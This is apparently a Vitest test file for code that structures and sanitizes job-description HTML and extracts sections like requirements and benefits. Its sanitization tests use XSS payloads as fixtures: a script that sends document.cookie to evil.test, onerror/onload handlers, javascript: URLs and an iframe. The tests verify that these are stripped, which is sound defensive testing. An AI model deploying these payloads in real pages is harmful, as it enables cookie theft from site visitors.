import { describe, expect, it } from "vitest";
import { sanitizeJobDescriptionHtml } from "@/lib/sanitizeJobDescriptionHtml";
import {
  classifyHtmlSections,
  extractHtmlSections,
  sectionHtml,
  structuredHtmlToText,
  toStructuredJobHtml,
} from "./jobHtml";

describe("toStructuredJobHtml", () => {
  it("turns div-based blocks into paragraphs so boundaries survive sanitization", () => {
    const html = toStructuredJobHtml("<div>First block.</div><div>Second block.</div>");
    expect(html).toBe("<p>First block.</p><p>Second block.</p>");
  });

  it("keeps headings, lists and emphasis", () => {
    const html = toStructuredJobHtml(
      "<h2>Responsibilities</h2><ul><li>Ship <strong>features</strong></li></ul>",
    );
    expect(html).toBe("<h2>Responsibilities</h2><ul><li>Ship <strong>features</strong></li></ul>");
  });

  it("downgrades h5/h6 to h4, which is the highest the renderer styles", () => {
    expect(toStructuredJobHtml("<h5>Perks</h5>")).toBe("<h4>Perks</h4>");
    expect(toStructuredJobHtml("<h6>Perks</h6>")).toBe("<h4>Perks</h4>");
  });

  it("unwraps links and spans but keeps their text", () => {
    expect(toStructuredJobHtml('<p>See <a href="https://x.test">our site</a></p>')).toBe(
      "<p>See our site</p>",
    );
  });

  it("drops scripts and styles with their contents", () => {
    const html = toStructuredJobHtml(
      "<p>Real body.</p><script>alert(1)</script><style>.x{color:red}</style>",
    );
    expect(html).toBe("<p>Real body.</p>");
    expect(html).not.toContain("alert");
    expect(html).not.toContain("color:red");
  });

  it("drops application forms and their inputs", () => {
    const html = toStructuredJobHtml(
      "<p>Body.</p><form><label>Name</label><input name='n'><button>Apply</button></form>",
    );
    expect(html).toBe("<p>Body.</p>");
  });

  it("removes empty blocks left behind by decorative markup", () => {
    expect(toStructuredJobHtml("<p>&nbsp;</p><div></div><p>Kept.</p>")).toBe("<p>Kept.</p>");
  });

  it("returns null for empty or tag-only input", () => {
    expect(toStructuredJobHtml("")).toBeNull();
    expect(toStructuredJobHtml("   ")).toBeNull();
    expect(toStructuredJobHtml("<div></div>")).toBeNull();
    expect(toStructuredJobHtml(null)).toBeNull();
  });
});

describe("16. A1 sanitization remains active over the richer crawler HTML", () => {
  // The point of the structuring step is that the A1 sanitizer PRESERVES it.
  // If these two ever disagree, descriptions silently flatten in production.
  it("passes structured output through the A1 sanitizer unchanged", () => {
    const structured = toStructuredJobHtml(
      "<div><h2>About</h2><p>We build things.</p>" +
        "<h3>Responsibilities</h3><ul><li>Own <strong>delivery</strong></li><li>Mentor</li></ul></div>",
    );
    expect(structured).toBeTruthy();
    expect(sanitizeJobDescriptionHtml(structured)).toBe(structured);
  });

  it("still strips a script injected into an ATS body", () => {
    const structured = toStructuredJobHtml(
      "<p>Legit copy.</p><script>fetch('https://evil.test?c='+document.cookie)</script>",
    );
    const safe = sanitizeJobDescriptionHtml(structured);
    expect(safe).not.toMatch(/script|evil\.test|document\.cookie/i);
    expect(safe).toContain("Legit copy.");
  });

  it("still strips event-handler attributes", () => {
    const safe = sanitizeJobDescriptionHtml(
      toStructuredJobHtml('<p onmouseover="steal()">Hover me</p><img src=x onerror=alert(1)>'),
    );
    expect(safe).not.toMatch(/onmouseover|onerror|steal|alert/i);
    expect(safe).toContain("Hover me");
  });

  it("still strips javascript: URLs", () => {
    const safe = sanitizeJobDescriptionHtml(
      toStructuredJobHtml('<p><a href="javascript:alert(1)">Click</a></p>'),
    );
    expect(safe).not.toMatch(/javascript:|alert/i);
    expect(safe).toContain("Click");
  });

  it("still drops iframes and svg payloads", () => {
    const safe = sanitizeJobDescriptionHtml(
      toStructuredJobHtml(
        '<p>Body</p><iframe src="https://evil.test"></iframe><svg onload=alert(1)></svg>',
      ),
    );
    expect(safe).not.toMatch(/iframe|svg|evil\.test|onload/i);
  });

  it("no retained tag carries any attribute", () => {
    const safe = sanitizeJobDescriptionHtml(
      toStructuredJobHtml('<p class="x" style="color:red" data-id="9">Text</p>'),
    );
    expect(safe).toBe("<p>Text</p>");
  });
});

describe("structuredHtmlToText", () => {
  it("renders blocks as newlines and list items with a dash", () => {
    const text = structuredHtmlToText("<p>Intro.</p><ul><li>One</li><li>Two</li></ul>");
    expect(text).toContain("Intro.");
    expect(text).toContain("- One");
    expect(text).toContain("- Two");
    expect(text).not.toContain("<");
  });

  it("decodes entities", () => {
    expect(structuredHtmlToText("<p>R&amp;D &gt; all</p>")).toBe("R&D > all");
  });

  it("returns null when nothing survives", () => {
    expect(structuredHtmlToText("")).toBeNull();
    expect(structuredHtmlToText(null)).toBeNull();
  });
});

describe("extractHtmlSections + classifyHtmlSections", () => {
  it("reads real heading tags", () => {
    const sections = extractHtmlSections("<h2>Requirements</h2><ul><li>Go</li></ul>");
    expect(sections).toEqual([{ heading: "Requirements", items: ["Go"] }]);
  });

  it("reads bold-paragraph pseudo-headings (the Greenhouse convention)", () => {
    const sections = extractHtmlSections(
      "<p><strong>Role &amp; responsibilities</strong></p><ul><li>Lead</li></ul>",
    );
    expect(sections[0].heading).toBe("Role & responsibilities");
    expect(sections[0].items).toEqual(["Lead"]);
  });

  it("reads short colon-terminated paragraphs (the SmartRecruiters convention)", () => {
    const sections = extractHtmlSections("<p>Key Responsibilities:</p><ul><li>Grow</li></ul>");
    expect(sections[0].heading).toBe("Key Responsibilities");
    expect(sections[0].items).toEqual(["Grow"]);
  });

  it("does not mistake a long sentence ending in a colon for a heading", () => {
    const long =
      "<p>We are looking for someone who can do all of the following things very well, namely:</p><ul><li>X</li></ul>";
    expect(extractHtmlSections(long)).toHaveLength(0);
  });

  it("classifies preferred qualifications before requirements", () => {
    const classified = classifyHtmlSections([
      { heading: "Preferred Qualifications", items: ["MBA"] },
      { heading: "Qualifications", items: ["Degree"] },
    ]);
    expect(classified.preferredQualifications).toEqual(["MBA"]);
    expect(classified.requirements).toEqual(["Degree"]);
  });

  it("buckets responsibilities, requirements and benefits", () => {
    const classified = classifyHtmlSections([
      { heading: "What you will do", items: ["Build"] },
      { heading: "Requirements", items: ["3 years"] },
      { heading: "Perks", items: ["Insurance"] },
    ]);
    expect(classified.responsibilities).toEqual(["Build"]);
    expect(classified.requirements).toEqual(["3 years"]);
    expect(classified.benefits).toEqual(["Insurance"]);
  });

  it("leaves a section with no list items unclassified", () => {
    const classified = classifyHtmlSections([{ heading: "Requirements", items: [] }]);
    expect(classified.requirements).toBeNull();
  });
});

describe("sectionHtml", () => {
  it("titles a section with an h2", () => {
    expect(sectionHtml("Company Description", "<p>Body</p>")).toBe(
      "<h2>Company Description</h2><p>Body</p>",
    );
  });

  it("escapes the title", () => {
    expect(sectionHtml("R&D <hack>", "<p>x</p>")).toBe("<h2>R&amp;D &lt;hack&gt;</h2><p>x</p>");
  });

  it("returns empty string when the body is empty", () => {
    expect(sectionHtml("Title", "")).toBe("");
  });
});
